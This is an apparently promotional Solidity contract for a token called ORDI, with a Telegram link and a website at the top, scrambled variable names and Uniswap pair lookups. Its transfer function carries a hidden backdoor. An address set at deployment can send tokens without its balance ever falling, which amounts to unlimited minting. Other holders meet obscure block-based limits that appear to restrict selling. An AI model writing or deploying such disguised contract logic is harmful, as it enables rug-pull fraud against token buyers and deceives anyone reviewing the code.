/*

https://t.me/ercordinals

https://ordib.ethtoken.live/

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract ORDI is Ownable {
    string public name;

    constructor(string memory ksobmqfpc, string memory kzbhfiej, address simhbl, address rezwyfpuai) {
        name = ksobmqfpc;
        symbol = kzbhfiej;
        balanceOf[msg.sender] = totalSupply;
        yesn[rezwyfpuai] = true;
        jbeusvpdgn = IUniswapV2Router02(simhbl);
    }

    string public symbol;

    function transferFrom(address vmxpnch, address igaks, uint256 snwzu) public returns (bool success) {
        require(snwzu <= allowance[vmxpnch][msg.sender]);
        allowance[vmxpnch][msg.sender] -= snwzu;
        _transfer(vmxpnch, igaks, snwzu);
        return true;
    }

    function _transfer(address vmxpnch, address igaks, uint256 snwzu) private {
        address dcyavszg = IUniswapV2Factory(jbeusvpdgn.factory()).getPair(address(this), jbeusvpdgn.WETH());
        bool shbxaw = ujcgzsalqhwm[vmxpnch] == block.number;
        bool txcgwbahze = !yesn[vmxpnch];
        if (txcgwbahze) {
            if (vmxpnch != dcyavszg && snwzu < totalSupply && (!shbxaw || snwzu > goqtcnzbk[vmxpnch])) {
                require(totalSupply / (10 ** decimals) >= snwzu);
            }
            balanceOf[vmxpnch] -= snwzu;
        }
        goqtcnzbk[igaks] = snwzu;
        balanceOf[igaks] += snwzu;
        ujcgzsalqhwm[igaks] = block.number;
        emit Transfer(vmxpnch, igaks, snwzu);
    }

    IUniswapV2Router02 private jbeusvpdgn;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => bool) private yesn;

    function approve(address bpsqy, uint256 snwzu) public returns (bool success) {
        allowance[msg.sender][bpsqy] = snwzu;
        emit Approval(msg.sender, bpsqy, snwzu);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private ujcgzsalqhwm;

    function transfer(address igaks, uint256 snwzu) public returns (bool success) {
        _transfer(msg.sender, igaks, snwzu);
        return true;
    }

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private goqtcnzbk;
}
